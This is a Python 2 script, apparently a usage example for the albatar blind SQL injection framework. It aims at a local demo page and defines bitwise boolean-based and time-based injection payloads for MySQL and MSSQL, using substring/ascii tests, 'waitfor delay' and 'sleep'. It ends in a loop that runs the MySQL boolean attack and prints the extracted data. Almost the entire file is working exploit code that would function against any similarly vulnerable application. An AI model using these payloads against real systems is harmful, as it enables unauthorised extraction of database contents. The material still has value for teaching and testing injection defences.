#!/usr/bin/env python

from sys import argv, exit
from albatar import *

PROXY = '' #http://127.0.0.1:8082'
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if '0 rows fetched' in body:
    return 0
  else:
    return 1

def test_state_time(headers, body, time):
  if time >= 1:
    return 1
  else:
    return 0

from urllib import quote_plus
def quote(s):
  return quote_plus(s, safe='${}:(),')

def mssql_boolean():

  template = " and 1=(select case when ((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}) then 1 else 0 end)"

  def make_requester():
    return Requester_HTTP(
      proxy = PROXY,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=7)

def mssql_time(sql):

  template = " if((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}) waitfor delay '0:0:2'--"

  def make_requester():
    return Requester_HTTP(
      proxy = PROXY,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=7)

def mysql_boolean():

  template = ' and (ascii(substr((${query}),${char_pos},1))&${bit_pos})=${bit_pos}'

  def make_requester():
    return Requester_HTTP(
      proxy = PROXY,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=7)

def mysql_time():

  template = ' and if(((ascii(substr((${query}),${char_pos},1))&${bit_pos})=${bit_pos}),sleep(1),1)'

  def make_requester():
    return Requester_HTTP(
      proxy = PROXY,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1)

#sqli = MySQL_Blind(mysql_boolean())
#sqli = MSSQL_Blind(mssql_boolean())
sqli = MySQL_Blind(mysql_boolean())
#sqli = MySQL_Blind(mysql_time())

start = time()
for r in sqli.exploit():
  stop = time()
  print r
  #print "dumped in %.2f seconds:" % (stop-start)
  start = time()
 
